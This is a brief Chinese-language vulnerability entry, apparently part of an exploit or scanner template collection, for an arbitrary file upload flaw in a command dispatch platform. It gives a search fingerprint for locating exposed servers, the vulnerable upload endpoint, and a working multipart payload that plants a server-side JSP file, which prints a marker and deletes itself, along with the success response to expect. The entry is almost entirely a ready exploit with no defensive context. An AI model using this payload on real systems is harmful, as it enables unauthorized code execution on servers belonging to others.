# 可视化融合指挥调度平台dispatch任意文件上传漏洞

可视化融合指挥调度平台dispatch ｜ 文件上传 ｜ —
- **指纹**：`body="/favicon.ico#/login"`
- **请求**：`POST /dispatch/layuiIm/uploadFile HTTP/1.1`

**Payload**
```
------HJBFIUERGBFUYERBVYUBBhbvuyvvtyckuhij
Content-Disposition: form-data; name="file";filename="dudesuite.jsp"
<% out.println("dudesuite!");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
------HJBFIUERGBFUYERBVYUBBhbvuyvvtyckuhij--
```
- **响应特征**：200 other